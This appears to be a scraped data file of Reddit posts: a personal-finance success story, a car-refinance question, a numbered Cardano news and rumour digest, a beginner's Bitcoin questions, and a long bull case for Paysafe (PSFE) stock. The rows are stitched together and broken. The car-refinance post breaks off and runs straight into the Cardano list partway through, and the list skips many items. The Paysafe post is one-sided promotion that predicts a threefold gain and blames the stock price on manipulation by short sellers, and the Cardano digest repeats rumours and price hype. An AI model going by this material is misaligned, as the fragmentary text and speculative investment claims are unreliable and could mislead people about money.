\-I kept my first home when I bought my current primary residence with my now wife. My mother lives in my first home and pays the bills. It does not cash flow, but I gain equity and a write off, more importantly she has a secure place to live.

\-I cut all my bills to as low as possible. We currently have a cheap cell phone plan and internet only. Our monthly cost is less than $90. We use old phones that are paid for.

\-I refinanced my student loans 3 times to get to an eventual rate of 2.4%. I aggressively paid them down despite the low interest rate, as I was looking for lifestyle freedom more than total returns. I am aware keeping the loans and investing the money would of netted me more in the last few years.

\-I utilized every credit card bonus I could. I would use 0% interest credit cards as ""short term loans"" and use them for all my purchases, while paying down against my debt with my cash. I would then take another out when one was close to being over with the 0% period and pay the original off. This saved me small amounts of money, but built a credit score that hovers in the low 800's.

\-I invest in broad based index funds in all my accounts.

Everything was very basic. I lived well below my means, I maxed out tax advantaged investment vehicles and paid off my debt. We have been fortunate enough that through doing all this my wife can be a SAHM to our 1 year old and we do not have to stress about money. I have also been able to leave my original job and take a job much closer to home, with shorter hours, even though it pays less. I am not FI at this point, however we were able to create a debt free situation that allows one of us to stay at home and raise our child and the other to take a pay cut for better hours/commute with more time at home.

I can say that I learned the majority of these concepts through MMM and financial posts on Reddit. I am appreciative and wanted to give back a success story on how much the basics work if you just stick it out.

TL;DR Living below your means, paying off your debt and investing in index funds pays off.

&amp;#x200B;

Edit: I rarely post on social media and am surprised at such a response. I mainly posted this to show that nothing fancy needs to be done to still have some financial success. No GME, no day trading, etc. To clarify a few things:

Salary- It is higher than average which allows a higher savings rate. I get that. I do agree it would of been harder on a lower salary. I think its clear that higher salary leads to more money to invest, which leads to higher net worth. That being said, in the north east, I feel like there are many people at or near 100k salaries. I have 3 friends who make over $100k who are not in health care. One has a bachelors degree in engineering, one went to one of those automotive schools advertised on TV and is a mechanic, and one dropped out of college and worked his way up at Walmart. You can make money without an advanced degree. All of these individuals have net worths near or above mine, as they have been working longer and did not have the opportunity cost of many years of college plus high tuition. 

Breakdown of net worth- I have $360k in investments/cash and $140k in home equity between 2 homes. My wife's finances are separate. We have a combined net worth of $750k.  

401k- I received a 5-6% match depending on the year, likely contributing $45k + in just base investment to my 401k. Unsure what that has added with returns. 

I do realize I have been fortunate to have invested and purchased real estate during a time of economic growth. Regardless, the principles don't change. Live below your means, take advantage of tax advantaged accounts, pay off debt and invest. I feel like whether it's Dave Ramsey, MMM, ChooseFI, The Money Guy (my current favorite), that it is all the same core message.

personalfinance,Refinance car or pay larger monthly payments?,"I have  2016 civic I financed 2 years ago through a Honda dealer. I had nearly 0 credit history at the time so I had my mom co-sign and got me a 8.75% for 75 months with the total cost of the car being 14.7k. 

I still owe 11k on the car but my credit score has gone up considerably to mid 700’s.

7. The Daedalus wallet now supports native tokens! [https://twitter.com/InputOutputHK/status/1376936748715020288](https://twitter.com/InputOutputHK/status/1376936748715020288)
8. Charles recently mentioned Senegal in the Julian Hosp interview. I believe that is the first time this nation state has been discussed in the context of the pan-African strategy for Cardano. [https://youtu.be/Zm6I1agqPWQ](https://youtu.be/Zm6I1agqPWQ)
9. Yesterday, there was a dev community Q&amp;A call with native token engineering lead and Plutus expert, Polina Vinogradova. Lots of good info shared there on all things fungible and non-fungible (including verification in the token registry and babel fees) in the Cardano ecosystem. To drive accuracy, only the party with the private key corresponding to the token minting will be able to make changes in the token registry as to that token.
10. In the native token call there was also a very interesting characterization of babel transactions as incomplete transactions that will include offers to exchange as a means to complete the transactions. “So, you will do two transactions or no transactions.” These incomplete transactions are called “liability transactions”. A group of them is called a “liability group”. When they get completed they are called a “closed liability group”. Babel fees are still very much in the paper writing phase. The team is currently agnostic as to how these exchange offers will be announced to stake pool operators. For more details on babel fees, we’ll have to wait for the paper.
11. Cardano Youtuber Big Pey just did two really good videos on the developing NFT scene in Cardano and how to accomplish manual escrow in discord so that you don’t get scammed trying to buy Cardano NFTs. The focus here was on the SpaceBudz series of NFTs. These kinds of manual procedures are probably the best that can be done right now. They also highlight how much easier everything will be once we get smart contracts with Alonzo since simple escrow like this is a prime use case for simple smart contracts that at the outset seem like they should be accomplishable even just in Marlowe.

13. Graph blockchain has announced an acquisition of $300k in ADA for staking purposes. Once the corporate finance world finds understands the dynamic around staking in Cardano, we may see announcements like this with dollar values that are orders of magnitude higher. Right now the corporate world is considering holding BTC on their balance sheets. But, yield on ADA holdings might become hyperattractive to a wide spectrum of companies once they understand the dynamics of staking and that a compounding yield is available for capture.

18. Charles tweets a pic of a Turaco and John Hancock. It seems safe to assume this means the minister has signed or is signing the Ethiopia deal! This could finally retire rumor #1 that started the Rumor Rundown. [https://twitter.com/ArmySpies/status/1378416705282613253](https://twitter.com/ArmySpies/status/1378416705282613253)

26. Liqwid founder, Dewayne Cameron, did a great interview with Cardano with Paul. It sounds like Liqwid is currently having a team of Haskell developers build out their product in Plutus for a target launch around the same time as Alonzo. This is great news since earlier in its history it looked like Liqwid would initially build in Solidity and use the KEVM bridge. Making their product native to Plutus out of the gate seems like a great move! Dewane also had some really good info about working with IOHK and how a team of seasoned Haskell devs could walk in and probably build anything in Plutus over a not too long timeline. Also a really good discussion of how EUTXO will give their users an advantage in predictability of transaction cost over users of account-balance (e.g. ETH) based competitors. [https://www.youtube.com/watch?v=dUDze81LCWs](https://www.youtube.com/watch?v=dUDze81LCWs)
27. Occam Association President, Mark Berger, also did an interview with Rick McCracken on Cardano Live. He provided some good detail on what Occam would like to deliver and where they currently are in their development. [https://youtu.be/vTBLIZ7voz8](https://youtu.be/vTBLIZ7voz8)
28. Tomorrow we’ll hit the items from the roadmap video that Charles just did.
29. Cardano is now being used as a traceability solution in conjunction with Scantrust for wine from the Nation State of Georgia. This is a great use case for the Cardano blockchain! [https://cardanofoundation.org/en/news/cardano-reveals-its-first-supply-chain-solution-in-association-with-scantrust/ https://www.scantrust.com/](https://cardanofoundation.org/en/news/cardano-reveals-its-first-supply-chain-solution-in-association-with-scantrust/)
30. The latest roadmap video from Charles covered a lot of ground. We’ll tackle it piece by piece. [https://youtu.be/WRYRjmMvkJM](https://youtu.be/WRYRjmMvkJM)
31. Ourobouros Omega. Ourobouros Classic 2016 was a “theoretical artifact” that IOHK could build upon. Ourobouros Praos was 2017 and it’s still running now. Ourobouros Genesis was 2018. Ourobouros Omega is going to be the capstone. It will be a rollup of all the previous iterations plus Redux, Chronos, Ledger Combiners, and some things they’ve learned from the larger industry. The paper and a prototype will be this year. We want to be there by Cardano 2025.
32. Light Clients/Wallets (e.g. Yoroi). Great way to get a view on the blockchain through a server. Trouble is that it’s not trustless as to the blockchain since you don’t download it. Protocols currently on the market like Mina are using recursive snarks (“zk-snark” = “Zero-Knowledge Succinct Non-Interactive Argument of Knowledge”). You can basically have a proof that proves 1) coins exist, and 2) haven’t been double spent with a goal of 22kb of data (very small amount of data). IOHK has been following Mina and “Bulletproofs” (also a type of snark). IOHK will bring out a paper and (hopefully) prototype of the Mithral Protocol this year. It will be a similar trustless model where light wallet is the default and you can still trust the blockchain on the server is correct without downloading the chain.
33. Today will be Part II of the coverage of the lates Roadmap vid from Charles. [https://youtu.be/WRYRjmMvkJM](https://youtu.be/WRYRjmMvkJM)
34. Sidechains. They call the main chain the “Cardano Settlement Layer” (CSL) and the side chains are called “Cardano Computation Layers” (CCL). They are looking at having CCLs for the EVM, IELE, Catalyst, and WASM (web assembly). They are trying to figure out how to pay for the maintenance of these side chains. A current thought is to possibly create a mechanism where you can “refine” ADA to get “fuel” for these sidechains. You could even have a Plutus side chain that runs on its own fuel. This year they will propose a Cardano Improvement Proposal (CIP) to see if the community wants to update the monetary policy in an HFC event to go in this direction. This could be a good way to include the parachain ideas from Polkadot. They could also add Hyperledger related permissioned sidechains with this.
35. Layer Two. A lot of deal flow with Prism right now around digital identify for things like authenticated wallets, KYC/AML, regulated DeFi, and human readable addresses. Charles will probably do a full video on this. Hydra is the other piece of off-chain infrastructure for this year. IOHK has a whole team working on this. They’ve already put out two papers on this. Will put out two more papers this year and a prototype will also be on the way. Hydra will be run by the stake pool operators.
36. “With all this, we’re going to piss all over what ETH 2.0 is trying to accomplish”. I’m paraphrasing slightly, but I almost spit out my coffee when he said this.
37. Quantum Resistance. This will be a big project involving: QR VRF, QR zero knowledge stuff, quantum signatures, and modeling of a quantum adversary. This is a huge amount of work. But this is a whole agenda that is in scope for Cardano 2025.
38. Catalyst &amp; Voltaire. Right now Catalyst is mainly about treasury but it needs to be linked to Voltaire which is all about protocol updates. This will probably mean a bicameral voting model that controls hard fork combinator events.There will be DAO as a service to provide voting rights for your users if you build a dApp or other project on Cardano. They will move from the current plutocracy to something that is hybridized between the current system and “proof of merit”. This is going to require a lot of thinking around the social science behind governance. It will be a more nuanced power dynamic.
39. Approach to the Reference Client.Right now it’s just Haskell, they will probably also build out clients in Python and Rust. Eventually they may have things like Agda, Idris, or Coq at the core. This notion of a “Core Developer” could end up being a digital identity that is authorized through voting.
40. Commercial. On the commercial side they are really going to scale things up to the eight figure level. There’s a lot of good news coming there. Charles says he is reserving that for the Africa Special.
41. Coinbase now has a Cardano Explainer. [https://www.coinbase.com/learn/crypto-basics/what-is-cardano](https://www.coinbase.com/learn/crypto-basics/what-is-cardano)

47. Dewayne Cameron was on Cardano Live.  Whether you are interested in DeFi or not, this is likely to be one of the big early Cardano based projects.  This interview has all the latest info on Liqwid.  Sounds like the alpha testnet will be end of April/early May with three or four core contracts. Rick does a really good job of asking questions that a large spectrum of listeners will be able to relate to and they get into the details of how the contracts will work.  At 20:01 Dewayne mentions a “Cardano Dex, or the Dex that IOHK and Emurgo are working on...”  Very interesting tidbit there! [https://youtu.be/JhO5iC08xSA](https://youtu.be/JhO5iC08xSA)
48. The Plutus Pioneer program has been open sourced! Lecture #1 has an extremely good explanation of why the EUTxO model in Cardano is so much more conducive to security and much greater predictability than the account balance model in Ethereum.   [https://github.com/input-output-hk/plutus-pioneer-program](https://github.com/input-output-hk/plutus-pioneer-program)
49. There is now a website that will mint Cardano NFTs for you.  Thanks to Cardano subreddit user Padierfind. [https://www.nft-maker.io/](https://www.nft-maker.io/)

51. Here’s a great way to visualize token minting and other on-chain activities thanks to Smaug Stake Pool. [https://pool.pm/](https://pool.pm/)
52. It looks like the automated NFT maker covered yesterday,  [nft-maker.io](https://www.nft-maker.io/), actually charges 10 ADA per NFT.  Just an update on the price there since it was unknown yesterday.  
53. The Cardano tattoo phenomenon continues. This time, we even have one that actually features a depiction of the namesake.

59. Occam.fi partners with Bitcoin.com as custodian to create an ETH-ADA bridge. According to the article, this will allow for any Cardano native token to seamlessly switch to an ERC-20 token and vice versa. The vice versa part is what the ERC-20 Converter does for us already right?

60. LunarCrush interviewed Charles and he gave us some more details on the Ethiopia deal and Africa:  1) the IOHK office in Ethiopia is merging with the Singularity Net Office (it’ll be 30-50 people...so pretty large presence); 2) Africa special to be announced very soon; 3) they will be doing fintech &amp; govtech, 4) everything on the governance side is going to be upgraded across a wide swathe of African nation states in next ten years, 5) lots of possible use cases including supply chains in agritech, putting land on a ledger, voting, identity, reputation (i.e. credit), &amp; payment systems; 6) Africa is like investing in China in the 1980s; 7) the demographics of Africa make it a really easy call to direct investment there; 8) charles said “Ethiopia, in particular, is very special to us and WE HAVE ACTUALLY CLOSED SOME DEALS...we’ll talk about those at the Africa Special”; 9) there will be security token plays in Africa in the mid 2020s since there are no stock exchanges; and 10) there is a big unannounced partnership called “the DCF” with a brand name consultancy we will recognize.

77. We just experienced a big flash crash in price. A prime suspect is the drop in hash rate in BTC due to the Blackouts in China. Is the crypto space ready to accept that Nakamoto style consensus on PoW leads directly to unacceptable levels of centralization? This has been the dirty secret of  PoW crypto and its decentralization loving enthusiasts for years.

78. Charles posted a somewhat cryptic tweet that read “Omega + Hydra + Mithral = GG”.  The Ourobors Omega, Ouroboros Hydra,  &amp; Mithral parts we’ve covered before.  Omega is a capstone rollup of Praos (2017), Genesis (2018), + Redux, +Chronos, +Ledger Combiners, +some other things from the rest of the space. Hydra is layer two. Mithral is trustless light wallets via zk-SNARKs.  Guesses as to the “GG” ranged from “Good Game” (as in game over for competitors) to “Goguen”.  See today’s video at the link above for more discussion on this.  [https://twitter.com/IOHK\_Charles/status/1383792375860924424](https://twitter.com/IOHK_Charles/status/1383792375860924424)

85. Shahaf Bar-Geffen, CEO of COTI (the first recipient of a Cardano CFund investment), says he just finished recording his segment in the Africa special which he mentioned was airing at the end of April prior to the IOHK announcement of April 29th. He also said: 1) ADA Pay may be ready in early May or maybe even late April; 2) there will be a big launch for ADA Pay and once the Africa Special airs “everything will connect”; 3) “people are probably not getting how big this is….but you will down the line”; 4) COTI integration with a major exchange is happening, progress is not as quick as they would like, but it’s progressing; 5) last week they released the possible designs for debit cards, they are even considering some designs submitted by the community; 6) and iOS and Android integration is coming along nicely and well on the way.

89. Recap from yesterday:  the Africa Special Announcements revealed some additional puzzle pieces 1) COTI’s AdaPay is possibly the larger payments infrastructure puzzle piece, 2) [payway.et](https://payway.et/) is possibly the local payments puzzle piece, 3)  [yellowcard.io](https://yellowcard.io/) is possibly the local coin exchange puzzle piece, and 4) World Mobile (not mentioned at [africa.cardano.org](https://africa.cardano.org/) AFAIK) may be the network connectivity puzzle piece. I think they are going to connect a lot of disparate pieces for us on the 29th.

91. Rick interviewed CardStarter which is a Cardano accelerator. The interesting items are 1) it appears they are purporting to somehow insure their community backers against certain financial losses with caveats, 2) they plan to fund projects prior to token launch through token vouchers, and 3) it sounds like they are building a DEX called Card Swap. Notice that the “insurance” comes with caveats.  They were very transparent on that point and people should take notice. Is CardStarter good? Is it bad?  I have no idea.

\~Army of Spies",cryptocurrency
Bitcoin,Is this a bitcoin revolution?,"Hi guys,

Newbie here, i've done some studies on bitcoin, learnt about the white paper, blockchain, history etc. and I went through every one of the bitcoin/ETH related podcast on Lex Fridman's channel, he had some really intellectual KOL from the community on there, the discussions were awesome, loved it. The common theme between what each of them said, in a nutshell, is that: basically the bottom 45% of US + rest of the world has had enough of the money printing bullshit by the US central bank, and bitcoin/crypto is the market's way of rebelling against that old system of inflation, by putting our money into this new thing we created and believe in. So now I have a few questions and I would very much appreciate it some of u wise apes/intellectual dark web followers, to give me some answers/ideas:

1) Many people compare Satoshi to George Washington when he had absolute power to be king but gave up that power to make the democratic foundations of the United States, saying Satoshi holds between 1-2 Mil BTC but it has never been spent and he disappeared. So are we at like the pre, or turning point, of a rebellion against the traditional monetary system and the US central bank, just as before the founding of the US rebelling against Britain? Has it really come to that point yet? 

2) Most people who aren't aware of bitcoin or not a part of the community don't really care for inflation as much as we think they do, they sort of just taken it as a natural law of economics to have their money ripped by of the central government, so is this fuming rage towards central finance just a thing within the BTC/crpto community?

3) where do we see this going into? we can't necessarily throw out the US fed, are the BTC holders going to one day force a Fed truce or negotiation of some sort?

4) while BTC is referred to as digital gold, the actual gold has been used as a storage of wealth dating back to 2000 BC, that is 4K years of human history with using gold, can BTC really replace gold as the reserve of wealth?

5) the BTC blockchain has not yet been hacked, but is it possible to be hacked through any methods(besides the 51% nodes break down, which is very straight forward and very unlikely) since even CIA gets hacked and stuff. 

6) there is a generational gap between BTC holders and traditional asset holders, the cutoff line averaging around 35 below and above, is this more of a clash of generational, given that young people don't hold assets or properties when we are born into this world, so are we essentially trying to opt for a new currency so we can devalue the dollar backed traditional currency?

&amp;#x200B;

Thanks so much for reading this! I really hope my newbie questions gets answered or if not then some nice folks will point me in the right direction to do some research. I am personally very bullish on BTC, i think its fantastic.",cryptocurrency

stocks,Reviewing the Bear Case on Paysafe (PSFE),"JP Morgan CEO, Jamie Dimon, recently noted that fintechs pose ""enormous competitive threats"" to banks and SF Federal Reserve board member, Jackie Reses, sees them “taking over and revolutionizing banking” with “a wholesale transition” of “a $16 trillion market cap”.

In this context, fintech Paysafe (PSFE) is newly listed on the NYSE and introduced to the US market. Already well known in Europe, Paysafe reports a substantial $362 million in free cash flow, projects $100 billion in transactional volume, $1.5 billion in revenue, healthy double-digit growth and expanding $30%+ EBITDA margins, but, despite absolutely no negative news, the stock has taken a pounding which, in turn, has brought the bears out in force with some dubious arguments. Sorry for the long post, but I thought I'd address all of these arguments in one post:

&amp;#x200B;

Common bear arguments:

\#1 Old business

\#2 Complex regulatory landscape / no moat

\#3 Growth by acquisition is risky and difficult

\#4 No growth

\#5 Slow growth

\#6 Not profitable

\#7 Too I much debt / they are going to dilute by borrowing more.

\#8 Blackstone made 3X and will sell

\#9 Founder share and warrant dilution.

&amp;#x200B;

\#1) Old business. 

Paysafe’s extensive experience in risk management and its time-tested regulatory expertise over many regions globally is one of its greatest strengths. This is the reason that Paysafe is the #1 global leader in iGaming payment processing, a rapidly moving space that is anticipated to grow 10X. “At Paysafe, the iGaming market volume was estimated to be $3.4 billion in 2019, and is now projected to reach $47 billion in 2025.”

Much of Paysafe’s business is in back-end payment processing so most don’t even know they are using it, but Paysafe is considered to be at the forefront in its field: Winner “Best Omni-Channel Payment Solution”, “Payment Processor of the Year,” and “Best Payment Method” and they are rapidly expanding in the US with new partnerships (just last 3 months: Coinbase, Microsoft, Luckbox, Amelco, Pointsbet, Virginia Lotto)

In Europe, where Paysafe is more known and used, Trustpilot (1) rates Paysafe as “Excellent” (4.7/5 stars) with over 25,000 reviews, and Skrill as “great” (4.2/5 stars) with over 17,000 reviews, while PayPal is rated ""bad"" (1.2/5 stars) with over 17,000 reviews.

Paysafe has the No. 2 global digital wallet with presence in 120 countries. They’ve just integrated their digital wallet platforms, Neteller and Skrill, recently voted “Best Digital Wallet” for “best consumer take up”, “most innovative technology” with “greatest potential to disrupt current ecosystems.”

Aside from Coinbase, Luckbox and Microsoft, they are partnered with Roblox, Draftkings, Spotify, Fortnight, Amazon, Twitch, bet365, ApplePay, Youtube, Visa, Betfair, PayLease, ESL Gaming, BetMGM, among many others. They are currently moving quickly to integrate their services to offer easier migration of eCash, integration of payment methods, cross-border payments and expansion into global banking as a service. 

In preparation for their plans, Paysafe's newly announced Board of Directors includes a former Morgan Stanley CEO, a former Chairman of the American Gaming Association and CEO of MGM Resorts International, a legal and regulatory expert in the multi-jurisdictional online and retail gambling industries, two senior Managing Directors from Blackstone, two from CVC, the CEO of Dun &amp; Bradstreet and CEO of Black Knight, and the Chairman of the Board of Fidelity.

As Chairman Bill Foley says, ""It’s going to be a land grab…I have a vision that we should be THE digital wallet… It’s our job to be there first and to make sure we dominate."" This doesn't sound like an old company resting on its laurels. 

&amp;#x200B;

\#2) Complex regulatory landscape / no moat. 

Bill Foley, Chairman of Fidelity and now also Paysafe’s Chairman of the Board, calls Paysafe,“a fortress. It’s got a moat… We have a proven strategy of winning as new global markets open. And most importantly, we have unrivaled regulatory risk and technical expertise."" Their regulatory acumen is the reason they currently dominate globally in sports betting/iGaming and are integrating their global platforms to expand into banking as a service. There are 1.7 billion ""unbanked"" because so many in the world who have mobile devices, still don't have access to the essential ID metrics that most banks and credit cards require to open accounts. Paysafe's risk management and cross boarder regulatory expertise offers a durable advantage in spaces where competing fintechs are hesitant to go. Leaning into this strength, they've brought on PayPal's former CRO and added a multi-jurisdictional regulatory expert to their Board of Directors

From SEC filed transcript (2) - Paysafe CEO, Philip McHugh: “To be a true global player in the iGaming space, the level of payments regulation, of gaming regulation and certification is very, very complex. When we talk about a deep and a wide moat, this is absolutely one of the areas that we see that benefit where it’s hard to copy.…We have over 300 professionals dedicated to risk, compliance, and analytics. That is very, very rare in the payments space. It’s a real strength of ours. We’ve been able to track some of the top people in the industry, including the former CRO from PayPal, and we’ve upgraded the team, we’ve built some real data capabilities, and we see this continuing to be an area of differentiation for Paysafe versus others.”

“To be a winner in this space, you’re catering to some incredibly demanding clients. They want to be global, they want multiple APMs, but they want you to understand payment regulation in hundreds of countries in gaming and gambling regulation in hundreds of countries. That’s something that Paysafe has developed very, very successfully in every market we’ve entered.”

&amp;#x200B;

\#3) Growth by acquisition is hard. 

Synergistic inorganic growth through M&amp;A is a key pillar of Paysafe’s forward growth strategy. Bill Foley's proven track record in quickly generating this kind of growth speaks for itself. Over the last five years Foley has grown Ceridian 3.3X ($4.2B to $14B), Dun &amp; Bradstreet 5.6X ($2B to $11.3B), and Black Knight 8.7X ($1.6B to $14B). He also grew FIS from $2.5 billion to over $91 billion (36.4X). Foley says, “Those characteristics of FIS are right in line with what we plan on doing with Paysafe.” (2, 4)

&amp;#x200B;

\#4) No growth. 

It’s true that Paysafe’s revenue stagnated in 2020 resulting from business closures during Covid, but prior to that they reported a strong 27% CAGR (4,5), which is on par with high profile competitors:

2017: $864 million rev

2018 : $1.14 billion rev (+32%)

2019 : $1.418 billion rev (+24%).

2020 : $1.426 billion. (+0.5%)

Unlike many fintechs, Paysafe has heavy exposure in brick-and-mortar retail and live sporting events, both of which were absolutely crushed in 2020 due to Covid. During this market dislocation, they pivoted, “exited low value referral channels” and made up revenue by expanding in the digital wallets and e-commmerce spaces, positioning themselves better going forward.

Looking at other brick-and-mortar payment processors hard-hit during the same period, like Visa and Mastercard, Paysafe performed very well by comparison:

—Visa: negative y-o-y revenue growth (-8.7%) and negative EBITDA growth (-10.2%)

— Mastercard: negative y-o-y revenue growth (-9.4%) and negative EBITDA growth (-14.20%)

Not claiming that Paysafe should be valued according to these two traditional payment processors but, given their commensurate slow down during Covid, it is interesting to note that their their averaged EV/Revenue multiples would put Paysafe at $46, which is very much in line with the valuation comps cited below.

&amp;#x200B;

\#5) Slow growth. 

Going forward, Paysafe conservatively projects $10-13% annual growth over the next two years but they are careful so say that those growth projections exclude M&amp;A plans and expansion in iGaming which is expected to grow at 55% CAGR over the next several years. iGaming accounts for over a third of Paysafe’s revenue so this growth is a significant exclusion.

Analyst Michael Del Grosso, who recently initiated coverage with a $19 price target (6) said, “we believe there is upside to our forecasts in the event of state-level legalization of iGaming.”

In the short time since he wrote that, here are some of the headlines signaling a price target upgrade:

1 ""New York State Legalizes Online Sports Wagering""

2 ""Maryland Online Sports Betting Bill Passes Legislature""

3 New Hampshire: ""Sports betting deal approved overwhelmingly; Hogan likely to sign""

4 ""Arizona governor signs bill legalizing sports betting""

5 ""Wyoming Legalizes Sports Betting""

6 ”Delaware igaming revenue up 74.3% year-on-year in March""

7 ""Pennsylvania gambling revenue rockets 162.7% in March - The biggest increase was recorded for sports wagering, where revenue rocketed by 326.1%""

8 “Caesars Entertainment (Paysafe partner) announced Official Sports Betting Partner of NFL""

9 “Michigan’s online sports betting launch hailed a success, Ohio could follow this year”

10 “Ohio legislators doubling down on legalized sports gambling”

11 “Louisiana Begins The Process of Legalized Sports Betting”

12 “Path to legalized Texas sports betting becomes more clear”

13 “NC lawmakers make push to legalize sports gambling to generate funding for schools”

14 ""Single-sports betting in Canada wins House vote, nears legalization""

15 “Florida poised to offer sports betting under major gambling deal”

16 “Legal Sports Betting Could Get To California Sooner Than You Think“

&amp;#x200B;

Looking at a larger basket of comps with a collective growth rate of \~12.5% (not far from Paysafe’s minimum 10.6% projection) here are valuations based on PayPal, Square, Nuvei, Repay, Shift4, Adyen, Affirm, bill, GPN, and Paysign among others:

&amp;#x200B;

Paysafe’s share price with average of sector peer multiples:

EV/EBITDA ratio : $122.09

EV/Rev ratio : $83.91

EV/FCF ratio : $87.86

Average: $97.95

&amp;#x200B;

After eliminating outliers with highest multiples:

EV/EBITDA ratio :$50.75

EV/Rev ratio : $44.64

EV/FCF ratio : $44.18

Average :$46.52

&amp;#x200B;

Notes:

1 Unlike Paysafe, around half of these competitors report negative EBITDA growth and a third report negative EBITDA and negative free cash flow.

2 Used low end of Paysafe's projections and factored in debt and high-end of potential dilution.

3 As noted Paysafe’s 10.6% rev growth projection excludes planned inorganic M&amp;A growth and projected 55% CAGR iGaming growth, which constitutes a third of their revenue.

4 The above comps were taken during a sector-wide pull-back and do not reflect recent fintech gains since Jamie Dimon’s ""enormous competitive threats"" comment.

In a nutshell, the basket of sector peers projects roughly 20% more growth than Paysafe yet trades at 350-750% higher multiples. With Paysafe having better financials than most, it is hard to argue that this is proportionate.

&amp;#x200B;

\#6) Not profitable. 

Paysafe expects $900 million in gross profit with healthy 30-32% EBITDA margin. As one recent article pointed out, “Paysafe has shown some intriguing projections in terms of its profitability. The company’s projected gross margin is 63%, an impressive number compared to competitors like Square with a gross margin under 30%.”
These fintech competitors are trading at much higher multiples but have worse EPS than Paysafe:

Repay: -0.67,

Affirm : -2.18,

Nuvei : -1.08,

Paysign : -0.19.

Bill : -0.62,

Shift4 : -0.43

Average EV/EBITDA multiples of the above companies would put Paysafe's SP at $69
If you read their transcripts and presentations, you’ll see that profit is being utilized to grow the business and integrate their global platforms into what they call Paysafe Unity. They’ve recently completed the integration of Skrill and Neteller digital wallets into a single code. Foley has indicated further elimination of redundancies to create new efficiencies and increase margins to enhance M&amp;A activities. From what I can tell, Foley is all about the long game.

&amp;#x200B;

\#7) Too I much debt / they are going to dilute by borrowing more.   
Paysafe just paid down $1.1 billion in debt. Why would they turn around and borrow again? As Fidelity’s Chairman of the Board, Bill Foley says: “One of the keys to this transaction and value creation for our shareholders is the reduction of Paysafe’s leverage ratio to 3.6x Debt/EBITDA.”

Their 3.6X Debt/EBITDA ratio is better than most fintech peers. Investopedia: “Debt/EBITDA measures a company's ability to pay off its incurred debt. A high ratio result could indicate a company has a too-heavy debt load.” 

Of the 11 fintech competitors I looked at, all but three (PYPL, ADYEY, NUVCF), have worse Debt/EBITDA ratios than Paysafe and many have negative EBITDA, making debt service that much more difficult:

Square: 77.8X

Repay : 8.7X

Fiserv : $21.2B / $4.7B : 4.5X

GPN : $10.27B / $2.8B : 3.67X

Shift4 : $1.8B / -$8M : negative EBITDA

Affirm : $1.67B / -77.6M negative EBITDA

Paysign : $4.3M / -$5.79M : negative EBITDA

Bill : $947M / -43.85M : negative EBITDA

Depending on whether you include SQ and AFRM, the combined multiples of the above competitors (by EV/EBITDA, EV/free cash flow or EV/revenue) puts Paysafe’s share price in the $45 to $90 range. Point being, their debt position is better than most and hardly a red flag. Further, management has said they’ll be able to fund M&amp;A plans with expanding 32-35%+ EBITDA margins ($500 - 560 million, 21% CAGR) and $362 million in free cash flow.

&amp;#x200B;

\#8) Blackstone made 3X and will sell. 

The common myth is that Blackstone/CVC made 300% by paying $3 billion to take Paysafe private and receiving $9 billion in the recent deal to bring it public. The reality, as reported by the Wall Street Journal (8), is that Blackstone/CVC took Paysafe private in 2017 for $3.9 Billion and they received about $5.6 billion in cash and shares on the recent deal. Adjusted for inflation, they paid $4.2 billion so it’s more like a 33% return on a 4 year hold.

Importantly, this came AFTER they grew revenue 65% ($864B to $1.426B), stewarded a billion in investments to grow the business, and the deal included paying down over $1.1 billion in debt. This suggests Foley cut a great deal for shareholders. It also explains why private equity has signaled that they'll stay on long term to reap much bigger gains through Foley’s time-tested M&amp;A playbook.

Blackstone itself says (9), “The term of private equity funds can be upwards of 7-10 years.” With so much runway and comps pointing to a 3-4X valuation, why would Blackstone leave so much money on the table?

Blackstone Senior Managing Director Eli Nagler signals an ongoing interest in staying on: “We believe Paysafe has a long runway for further growth and look forward to remaining part of the team and seeing their continued success as a public company.”

In a recent interview Foley said, private equity’s plan to stay on was part of what encouraged PIPE to invest $2 billion: “They rolled a significant amount of their investment which is a confidence builder. They didn’t take all their money off the table…All of these things put together really created the confidence among the investor base to invest in the PIPE and then support the stock.”

This trust was reiterated in the SEC filed FTAC’s Board of Directors’ Reasons for the Approval of the Business Combination: “Commitment of Paysafe’s Owners. The FTAC Board believes that the CVC Investors, the Blackstone Investors and other current indirect stockholders of PGHL continuing to own a substantial percentage of the post-combination company on a pro forma basis reflects such stockholders’ belief in and commitment to the continued growth prospects of Paysafe going forward.”

The PIPE investors are even less of a concern because they are title and life insurance companies known for long-term investment strategies, they are closely aligned with Foley and understand both his M&amp;A track record and his ability to create mutually beneficial synergistic deals through what Bloomberg called the “The Foley Network” (perhaps, for example, Paysafe will handle Fidelity’s massive transactional volume). 
In a recent Bloomberg interview, Bill Foley said, “The thing that was different about our transaction is that we brought capital to the table. The companies that I’m affiliated with actually invested roughly a billion dollars in the PIPE and forward purchase agreements so Paysafe was always a really protected asset besides the fact that it’s a great asset.”

Besides, just as large funds will often drive price down to accumulate large positions, they also can drive price up to sell into strength and will do so via off-market trades to avoid price slippage. Therefore, we probably wouldn’t even notice profit taking until after quarterly filings. Paysafe’s fundamental value in context indicates such prospects present very little long term risk, especially from current price levels. Given Paysafe's $100B market share (similar to Square’s), once audited numbers are available, many large funds focused on this space will necessarily seek a more balanced exposure through Paysafe.

&amp;#x200B;

\#9) Founder share and warrant dilution. 

According to the 20F recently filed, roughly 53 million warrants pose potential dilution at a maximum of 7.5% (movement we've seen in a day), but the cashless conversion option, generally exchanging 3 warrants for a single share, can reduce that dilution by 2/3 to around 2.5%. It is very likely that many will use this option since most warrant holders do not have the extra cash to pay an additional $11.50 for each warrant conversion. It will probably be somewhere in the middle of the two scenarios (\~5%) but this is not a major concern in the scheme of things.

Importantly, the 20F also shows that all founder shares are already included in the current outstanding share count so there is no risk of dilution there.

Total FTAC Founder shares 175,292,458 24.2 % 

Blackstone Investors 123,734,571 17.1 % 

CVC Investors 156,006,433 21.6 %

Despite a lack of negative news, short sellers and bashers have been able to exploit a perfect storm of doubt created by seemingly unrelated events ranging from forced selling pressure coming from widely reported changes in margin requirements (25% to 100% upon ticker change without any prior notice), to simultaneous limits on buying resulting from excessive delays (7+ trading days) in the new PSFE ticker being available on many platforms, to things in the media that this sub will not allow to be discussed.  In this context, it is hard not to see a month's worth of “fake sell walls” and HFS “short ladder attacks” as anything other than opportunistic price manipulation but, speculation can only get you so far. 

I think Paysafe is currently undervalued and, as the developments in legalized sports betting come to fruition, it is very likely a 3X from here. M&amp;A plans already in the works will bring additional catalysts. Given Paysafe's healthy fundamentals, large market share in a fintech space known for “sticky” customers, and exposure to high growth verticals like iGaming, it seems inevitable that large funds will seek to benefit from these low prices, especially once the first audited quarterly numbers are available on May 11th.

